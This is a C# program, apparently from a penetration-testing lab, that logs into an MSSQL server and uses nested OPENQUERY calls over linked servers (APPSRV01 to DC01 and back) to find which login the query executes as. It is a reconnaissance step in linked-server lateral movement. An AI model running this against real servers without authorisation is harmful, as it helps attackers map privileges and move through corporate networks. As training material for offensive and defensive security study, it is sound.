using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MSSQL___Liked_Servers_Query_Logins_from_arbitrary_server
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            //Authenticates
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            //Hace la query desde DC01 hacia APPSRV01
            String execCmd = "select myuser from openquery(\"dc01\", 'select myuser from openquery(\"appsrv01\", ''select SYSTEM_USER as myuser'');');";
            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("Executing as login: " + reader[0] + " from DC01 to APPSRV01");
            }
            
            reader.Close();

            con.Close();
        }
    }
}